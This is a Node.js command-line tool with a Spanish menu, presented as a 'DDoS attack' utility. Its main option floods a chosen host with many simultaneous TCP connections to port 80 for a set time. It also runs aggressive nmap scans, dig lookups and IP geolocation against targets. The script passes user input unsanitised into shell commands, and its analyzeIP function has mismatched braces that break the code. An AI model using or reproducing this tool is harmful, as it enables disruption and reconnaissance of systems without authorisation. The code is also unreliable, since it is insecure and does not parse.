const net = require('net');
const rl = require('readline').createInterface({
  input: process.stdin,
  output: process.stdout
});

const colors = {
  reset: '[0m',
  bright: '[1m',
  dim: '[2m',
  underscore: '[4m',
  blink: '[5m',
  reverse: '[7m',
  hidden: '[8m',
  fg: {
    black: '[30m',
    red: '[31m',
    green: '[32m',
    yellow: '[33m',
    blue: '[34m',
    magenta: '[35m',
    cyan: '[36m',
    white: '[37m',
  },
  bg: {
    black: '[40m',
    red: '[41m',
    green: '[42m',
    yellow: '[43m',
    blue: '[44m',
    magenta: '[45m',
    cyan: '[46m',
    white: '[47m',
  }
};

const decorations = {
  underline: '[4m',
  bold: '[1m',
  italic: '[3m',
};

const async = require('async');
const axios = require('axios');
const geoip = require('geoip-lite');
const { exec } = require('child_process');

const showMenu = () => {
  console.clear();
  console.log('[31m[1m                DDoS attack   ');
  console.log('[36m[1m      ⭐️ Desarrollado por Keiji821');
  console.log('                ');
  console.log('[32m【1[32m】 [37m[1m Iniciar ataque DDoS');
  console.log('[32m【2[32m】 [37m[1m Actualizar código');
  console.log('[32m【3[32m】 [37m[1m Configurar conexiones simultáneas');
  console.log('[32m【4[32m】 [37m[1m Aumentar potencia del ataque');
  console.log('[32m【5[32m】 [37m[1m Información de DNS para una dirección IP');
  console.log('[32m【6[32m】 [37m[1m Análisis de IP');
  console.log('[32m【7[32m】 [37m[1m Información geográfica de IP');
  console.log('               ');
  console.log('[32m【0[32m】❌️ [31m[1m Salir');
  console.log('               ');
  rl.setPrompt('[37m[1m ｢🌐｣➤ ');
  rl.prompt();
};

let numConnections = 100; // Número de conexiones simultaneas por defecto
let attackDuration = 60; // Duración del ataque por defecto

const ddosAttack = async (url, numConnections, attackDuration) => {
try {
console.log(`[32m[1m Iniciando ataque DDoS...`);
const sockets = [];
for (let i = 0; i < numConnections; i++) {
const socket = new net.Socket();
socket.connect(80, url, () => {
console.log(`[31m[1m
 ╭────────────────────────────────╮
 │ ⚠️ Conectado a ${url}   │
 ╰────────────────────────────────╯`);
});
socket.on('data', (data) => {
console.log(`[33m[1m Dato recibido de ${url}`);
});
socket.on('error', (err) => {
console.error(`Error: ${err}`);
});
sockets.push(socket);
}

setTimeout(() => {
console.log('[32m[1m Ataque finalizado');
sockets.forEach((socket) => socket.destroy());
}, attackDuration * 1000);
} catch (error) {
console.error(`Error: ${error}`);
}
};

const updateCode = async () => {
try {
console.log(`[36m[1m Actualizando código...`);
const exec = require('child_process').exec;
exec('git pull origin main', (error, stdout, stderr) => {
if (error) {
console.error(`Error: ${error}`);
} else {
console.log(`[32m[1m Código actualizado correctamente!`);
}
});
} catch (error) {
console.error(`Error: ${error}`);
}
};


const getInfo = async (ip) => {
try {
const command = `dig +nocmd ${ip} any +multiline`;
exec(command, (error, stdout, stderr) => {
if (error) {
console.error(`Error: ${error.message}`);
return;
}
const lines = stdout.trim().split(String.raw`
`);
const details = [];
for (const line of lines) {
if (line.includes(';; ANSWER SECTION:')) {
details.push('** ANSWER SECTION **');
} else if (line.includes(';')) {
const [key, value] = line.split(';');
details.push(`  ${key.trim()}: ${value.trim()}`);
} else {
const parts = line.split(/\s+/);
const recordType = parts[3];
const ttl = parts[1];
const value = parts[4];
switch (recordType) {
case 'A':
details.push(`  IP Address: ${value} (TTL: ${ttl} seconds)`);
break;
case 'AAAA':
details.push(`  IPv6 Address: ${value} (TTL: ${ttl} seconds)`);
break;
case 'NS':
details.push(`  Name Server: ${value} (TTL: ${ttl} seconds)`);
break;
case 'MX':
details.push(`  Mail Server: ${value} (TTL: ${ttl} seconds)`);
break;
case 'SOA':
details.push(`  Start of Authority: ${value} (TTL: ${ttl} seconds)`);
break;
default:
details.push(`  Unknown Record Type: ${recordType} (TTL: ${ttl} seconds)`);
}
}
}
console.log(` DNS Information for ${ip}:`);
console.log(`---------------------------`);
console.log(details.join(String.raw`
`));
console.log(`---------------------------`);
});
} catch (error) {
console.error(`Error: ${error.message}`);
}
};






const Spinner = require('cli-spinner').Spinner;
const chalk = require('chalk');

const analyzeIP = async (ip) => {
try {
const spinner = new Spinner('Iniciando análisis de %s...'.green);
spinner.setSpinnerString(18);
spinner.start();

const command = `nmap -A -T4 ${ip}`;
exec(command, (error, stdout, stderr) => {
if (error) {
console.error(`Error: ${error.message}`);
return;
}
const lines = stdout.trim().split(String.raw`
`);

let os = '';
let hostname = '';
let address = '';
let openPorts = [];
let closedPorts = [];
let filteredPorts = [];
let unfilteredPorts = [];
let services = {};
let versions = {};
let scripts = {};
let macAddress = '';
let deviceType = '';
let uptime = '';
let tcpSequence = '';
let ipIdSequence = '';
let osCPE = '';
let osGeneration = '';
let banner = '';

for (const line of lines) {
if (line.includes('Nmap scan report for')) {
hostname = line.split('for ')[1].trim();
console.log(`Hostname: ${hostname}`);
} else if (line.includes('Address:')) {
address = line.split(':')[1].trim();
console.log(` Dirección IP: ${address}`);
} else if (line.includes('OS:')) {
os = line.split(':')[1].trim();
console.log(`Sistema Operativo: ${os}`);
} else if (line.includes('open')) {
const port = line.split(' ')[0].trim();
openPorts.push(`${port}/tcp`);
} else if (line.includes('closed')) {
const port = line.split(' ')[0].trim();
closedPorts.push(`${port}/tcp`);
} else if (line.includes('filtered')) {
const port = line.split(' ')[0].trim();
filteredPorts.push(`${port}/tcp`);
} else if (line.includes('unfiltered')) {
const port = line.split(' ')[0].trim();
unfilteredPorts.push(`${port}/tcp`);
}
} else if (line.includes('Service:')) {
const service = line.split(':')[1].trim();
const port = line.split(' ')[0].trim();
services[port] = service;
} else if (line.includes('Version:')) {
const version = line.split(':')[1].trim();
const port = line.split(' ')[0].trim();
versions[port] = version;
} else if (line.includes('Script:')) {
const script = line.split(':')[1].trim();
const port = line.split(' ')[0].trim();
scripts[port] = script;
} else if (line.includes('MAC Address:')) {
macAddress = line.split(':')[1].trim();
} else if (line.includes('Device type:')) {
deviceType = line.split(':')[1].trim();
} else if (line.includes('Uptime:')) {
uptime = line.split(':')[1].trim();
} else if (line.includes('TCP Sequence Prediction:')) {
tcpSequence = line.split(':')[1].trim();
} else if (line.includes('IP ID Sequence Generation:')) {
ipIdSequence = line.split(':')[1].trim();
} else if (line.includes('OS CPE:')) {
osCPE = line.split(':')[1].trim();
} else if (line.includes('OS Generation:')) {
osGeneration = line.split(':')[1].trim();
}

spinner.stop();
console.log(`PUERTOS: ${openPorts.join(', ') || 'Sin resultados'} (Abiertos), ${closedPorts.join(', ') || 'Sin resultados'} (Cerrados), ${filteredPorts.join(', ') || 'Sin resultados'} (Filtrados), ${unfilteredPorts.join(', ') || 'Sin resultados'} (No Filtrados)`);

console.log(`SERVICIOS:`);
for (const port in services) {
console.log(`  Puerto ${port}: ${services[port] || 'Sin resultados'}`);
}
console.log(`VERSIONES:`);
for (const port in versions) {
console.log(`  Puerto ${port}: ${versions[port] || 'Sin resultados'}`);
}

console.log(`SCRIPTS:`);
for (const port in scripts) {
console.log(`  Puerto ${port}: ${scripts[port] || 'Sin resultados'}`);
}

console.log(`INFORMACIÓN ADICIONAL:`);
console.log(`  Dirección MAC: ${macAddress || 'Sin resultados'}`);
console.log(`  Tipo de dispositivo: ${deviceType || 'Sin resultados'}`);
console.log(`  Tiempo de actividad: ${uptime || 'Sin resultados'}`);
console.log(`  Predicción de secuencia TCP: ${tcpSequence || 'Sin resultados'}`);
console.log(`  Generación de secuencia de ID de IP: ${ipIdSequence || 'Sin resultados'}`);
console.log(`  CPE del Sistema Operativo: ${osCPE || 'Sin resultados'}`);
console.log(`  Generación del Sistema Operativo: ${osGeneration || 'Sin resultados'}`);
}
});
} catch (error) {
console.error(`Error: ${error.message}`);
}
};





const getGeoIP = async (ip) => {
try {
const response = await axios.get(`http://ip-api.com/json/${ip}`);
const data = response.data;
console.log(` `);
console.log(`[32m[1m 
        ╭─────────────────────────╮
        │ 🌕 Información de la IP │
        ╰─────────────────────────╯`);
console.log(`[32m[1m       〔[36m01[32m〕  [31m[1m IP: [36m ${data.query}`);
console.log(`[32m[1m       〔[36m02[32m〕  [31m[1m Estatus: [36m ${data.status}`);
console.log(`[32m[1m       〔[36m03[32m〕  [31m[1m Continente: [36m ${data.continent}`);
console.log(`[32m[1m       〔[36m04[32m〕  [31m[1m Código del continente: [36m ${data.continentCode}`);
console.log(`[32m[1m       〔[36m05[32m〕  [31m[1m País: [36m ${data.country}`);
console.log(`[32m[1m       〔[36m06[32m〕  [31m[1m Código del país: [36m ${data.countryCode}`);
console.log(`[32m[1m       〔[36m07[32m〕  [31m[1m Región: [36m ${data.region}`);
console.log(`[32m[1m       〔[36m08[32m〕  [31m[1m Estado: [36m ${data.regionName}`);
console.log(`[32m[1m       〔[36m09[32m〕  [31m[1m Ciudad: [36m ${data.city}`);
console.log(`[32m[1m       〔[36m10[32m〕  [31m[1m  Distrito: [36m ${data.district}`);
console.log(`[32m[1m       〔[36m11[32m〕  [31m[1m  Código postal: [36m ${data.zip}`);
console.log(`[32m[1m       〔[36m12[32m〕  [31m[1m  Latitud: [36m ${data.lat}`);
console.log(`[32m[1m       〔[36m13[32m〕  [31m[1m  Longitud: [36m ${data.lon}`);
console.log(`[32m[1m       〔[36m14[32m〕  [31m[1m  Zona horaria: [36m ${data.timezone}`);
console.log(`[32m[1m       〔[36m15[32m〕  [31m[1m  Offset: [36m ${data.offset}`);
console.log(`[32m[1m       〔[36m16[32m〕  [31m[1m  Moneda: [36m ${data.currency}`);
console.log(`[32m[1m       〔[36m17[32m〕  [31m[1m  ISP: [36m ${data.isp}`);
console.log(`[32m[1m       〔[36m18[32m〕  [31m[1m  Empresa: [36m ${data.org}`);
console.log(`[32m[1m       〔[36m19[32m〕  [31m[1m  AS: [36m ${data.as}`);
console.log(`[32m[1m       〔[36m20[32m〕  [31m[1m  Nombre de AS: [36m ${data.asname}`);
console.log(`[32m[1m       〔[36m21[32m〕  [31m[1m  Es un celular: [36m ${data.mobile}`);
console.log(`[32m[1m       〔[36m22[32m〕  [31m[1m  Es un proxy: [36m ${data.proxy}`);
console.log(`[32m[1m       〔[36m23[32m〕  [31m[1m  Es un hosting: [36m ${data.hosting}`);
} catch (error) {
console.error(`Error: ${error.message}`);
}
};


rl.on('line', (option) => {
switch (option.trim()) {
case '1':
console.log('[36m[1m Ingrese la URL o IP del objetivo');
rl.question('[32m[1m IP/Dominio: ', (url) => {
if (url === '') {
console.log('[33m[1m URL invalida');
showMenu();
} else {
ddosAttack(url, numConnections, attackDuration);
showMenu(); // Volver a mostrar el menú principal
}
});
break;
case '2':
updateCode();
showMenu(); // Volver a mostrar el menú principal
break;
case '3':
console.log('[36m[1m Ingrese el número de conexiones simultaneas');
rl.question('[32m[1m Conexiones: ', (conexiones) => {
if (conexiones === '') {
console.log('[31m[1m Valor invalido');
showMenu();
} else {
numConnections = parseInt(conexiones);
console.log(`[36m[1m Conexiones simultaneas establecidas en ${numConnections}`);
showMenu(); // Volver a mostrar el menú principal
}
});
break;
case '4':
console.log('[36m[1m Ingrese la duración del ataque (en segundos):>');
rl.question('Duración: ', (duration) => {
if (duration === '') {
console.log('[31m[1m Valor invalido');
showMenu();
} else {
attackDuration = parseInt(duration);
console.log(`[36m[1m Duración del ataque establecida en ${attackDuration} segundos`);
showMenu(); // Volver a mostrar el menú principal
}
});
break;
case '5':
console.log('[36m[1m Ingrese la IP para obtener información');
rl.question('[32m[1m IP: ', (ip) => {
if (ip === '') {
console.log('[36m[1m IP invalida');
showMenu();
} else {
getInfo(ip);
showMenu();
}
});
break;
case '6':
console.log('[36m[1m Ingrese la IP para análisis ');
rl.question('[32m[1m IP: ', (ip) => {
if (ip === '') {
console.log('[31m[1m IP invalida');
showMenu();
} else {
analyzeIP(ip);
showMenu();
}
});
break;
case '7':
console.log('[36m[1m Ingrese la IP para obtener información geográfica');
rl.question('[32m[1m IP: ', (ip) => {
if (ip === '') {
console.log('[31m[1m IP invalida');
showMenu();
} else {
getGeoIP(ip);
showMenu();
}
});
break;
case '0':
console.log('[32m[1m Saliendo...');
process.exit();
break;
default:
console.log('[31m[1m Opción invalida');
showMenu();
}
}).on('close', () => {
process.exit();
});
